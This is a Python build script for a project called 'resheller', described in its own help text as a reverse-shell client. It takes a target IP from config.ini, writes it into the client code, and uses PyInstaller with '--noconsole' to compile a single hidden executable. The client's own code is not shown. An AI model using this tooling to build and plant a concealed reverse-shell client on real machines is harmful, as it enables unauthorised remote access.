import sys
from argparse import ArgumentParser, Namespace
from configparser import ConfigParser
from importlib import import_module
from ipaddress import IPv4Address
from os import path, name, getcwd, remove
from shutil import copyfile, rmtree
from subprocess import Popen, PIPE, STDOUT
from textwrap import wrap

from root_finder import get_project_root

from lib.stdout import color


class Build:
    """Call to resolve config paths and create uninitiated configs"""

    def __init__(self, user: bool) -> None:
        self.user = user
        self.executed = False
        self.install = True
        self.venv = hasattr(sys, 'real_prefix')
        self.repo = get_project_root("resheller")
        self.client = "client.exe" if name == "nt" else "client"
        self.conf_ini = path.join(self.repo, 'config.ini')
        self.package = path.join(self.repo, "resheller")
        self.client_dir = path.join(self.package, "src", "client")
        self.client_exe = path.join(self.repo, "dist", self.client)
        self.requirements = self.get_reqs()

    def write_ip_file(self, ip: str) -> None:
        ip_file = path.join(self.client_dir, "ip.py")
        with open(ip_file, "w") as file:
            file.write("#!/usr/bin/env python3\n")
            file.write("def get_ip():\n")
            file.write("    return %s\n" % ip)
            file.close()

    def run_pip(self, args: list) -> None:
        cmd = [sys.executable, "-m", "pip"]
        for arg in args:
            cmd.append(arg)
        self.run_command(cmd)

    def run_command(self, cmd: list) -> None:
        proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, encoding='utf8')
        stdout, _ = proc.communicate()
        for line in stdout.splitlines():
            for row in wrap(line, 75):
                if "Requirement already satisfied" in row:
                    return
                elif "You are using pip version" in row:
                    self.run_pip(["install", "--upgrade", "pip"])
                print(f"    {row}")
                self.executed = True

    def get_reqs(self) -> list:
        req_file = path.join(self.repo, "requirements.txt")
        with open(req_file, "r") as reqs:
            lines = reqs.readlines()
            reqs.close()
        return lines

    def read_package_path(self) -> None:
        for line in self.requirements:
            try:
                module = import_module(line.split("=")[0])
                module = wrap(module.__file__, 71)
                print(f"      {color.b_grn.get('*')}  {module.pop(0)}")
                for row in module:
                    print(f"           {row}")
            except ImportError:
                pass

    def resolve_user(self) -> None:
        if self.user and self.venv:
            color.ylw.print("    Cannot install requirements as --user")
            color.ylw.print("    Virtual environment is active")
        elif not self.install:
            color.ylw.print("    Uninstall does not take the --user flag")
            color.ylw.print("    Try manually removing installations")
            color.ylw.print("    They may be in the following location(s)")
            self.read_package_path()
        else:
            return
        self.user = False

    def manage_requirements(self) -> None:
        if self.user:
            self.resolve_user()
        for line in self.requirements:
            if self.install:
                args = ["install", line]
                if self.user:
                    args.append("--user")
            else:
                args = ["uninstall", "--yes", line]
            self.run_pip(args)

    def make_config(self) -> None:
        def_ini = path.join(self.package, "lib", 'default.ini')
        copyfile(def_ini, self.conf_ini)
        color.grn.print("Initiated config.ini:")
        color.ylw.print("    Enter target's IP in config then run build.py")
        exit(0)

    def get_ip(self) -> None:
        config = ConfigParser()
        conf_ini = path.join(getcwd(), 'config.ini')
        config.read(conf_ini)
        ipv4 = config["IP"]["server"]
        try:
            IPv4Address(ipv4.strip('"'))
        except ValueError as err:
            if "Enter target IP here" in ipv4:
                prompt = "    Enter target's IP in the config file (config.ini)"
                color.red.print(prompt)
            else:
                color.b_red.print("    Not a valid IPv4 Address:")
                color.b_red.print(f"    {err}")
            exit(0)
        self.write_ip_file(ipv4)

    def make_exe(self) -> None:
        client_py = path.join(self.client_dir, "client.py")
        if path.isfile(self.client_exe):
            color.ylw.print("    Resheller already installed\n")
            print("Hint: Run build.py -r to reinstall")
        else:
            cmd = ["pyinstaller", "--onefile", "--noconsole", client_py]
            self.run_command(cmd)
            color.ylw.print("    Installation Successful").ylw()
            print()
            color.ylw.print(f"Find {self.client} in ./dist")

    def install_requirements(self, install_reqs: bool = True) -> None:
        color.b_grn.print("[Install]")
        if not path.isfile(self.conf_ini):
            if install_reqs:
                color.grn.print("Installing package requirements:")
                self.manage_requirements()
                if self.executed:
                    color.ylw.print("    Package requirements satisfied\n")
                else:
                    color.ylw.print("    Requirements already installed\n")
            self.make_config()
        self.get_ip()
        color.grn.print("Installing package:")
        self.make_exe()

    def rm_build(self) -> list:
        items = []
        for item in ["build", "dist", self.conf_ini, "client.spec"]:
            try:
                remove(item)
                color.ylw.print(f"    {path.basename(item)}")
                items.append(path.basename(item))
            except PermissionError as err:
                if item == "dist":
                    color.red.print(err)
                    print(f'Hint: Try looking for "{self.client}" '
                          f'in your running processes')
                    exit(0)
                rmtree(item)
            except FileNotFoundError:
                continue
            color.ylw.print(f"    {path.basename(item)}")
            items.append(path.basename(item))
        if len(items) > 1:
            items.insert(len(items[:-1]), "and")
        return items

    def clean(self, install_reqs: bool = True) -> None:
        self.install = False
        color.grn.print("[Clean]")
        if install_reqs:
            color.grn.print("Removing package requirements:")
            print(self.executed)
            self.manage_requirements()
            if self.executed:
                color.ylw.print("    Package requirements removed\n")
            else:
                color.ylw.print("    No requirements to uninstall\n")
        color.grn.print("Removing:")
        items = self.rm_build()
        if items:
            confirm = ''.join([str(f'{item}, ') for item in items])
            confirm = confirm.replace(", and,", " and")
            color.grn.print("Removed:")
            color.ylw.print(f"    {confirm[:-2]}")
        else:
            color.ylw.print("    Nothing to Remove")
        self.write_ip_file('"Enter target IP here"')

    def reinstall(self) -> None:
        install_reqs = True
        color.b_grn.print("[Reinstall]")
        color.grn.print("Running reinstall:")
        if path.isfile(self.conf_ini):

            print()
            self.clean(install_reqs=False)
            print()
            if path.isfile(self.client_exe):
                install_reqs = False
            self.install = True
            self.install_requirements(install_reqs)
        else:
            color.ylw.print("    Package is not installed")


def argument_parser() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument(
        "build",
        help="build the reverse-shell client",
    )
    parser.add_argument(
        "-d",
        "--dummy",
        help="test with this",
        action="store_true"
    )
    parser.add_argument(
        "-c",
        "--clean",
        help="remove everything ",
        action="store_true"
    )
    parser.add_argument(
        "-r",
        "--reinstall",
        help="clean the repository without removing requirements and install "
             "the package and requirements if necessary",
        action="store_true"
    )
    parser.add_argument(
        "-u",
        "--user",
        help="install requirements to user python path",
        action="store_true"
    )
    return parser.parse_args()


def usage() -> None:
    parser = ArgumentParser()
    parser.add_argument("--usage")
    parser.parse_args()
    print(parser.print_help())


def main() -> None:
    args = argument_parser()
    make = Build(args.user)
    try:
        assert args.build == "build"
        if args.reinstall:
            make.reinstall()
        elif args.clean:
            make.clean()
        elif args.dummy:
            print(10 * "DUMMY\n")
        else:
            make.install_requirements()
    except AssertionError:
        usage()
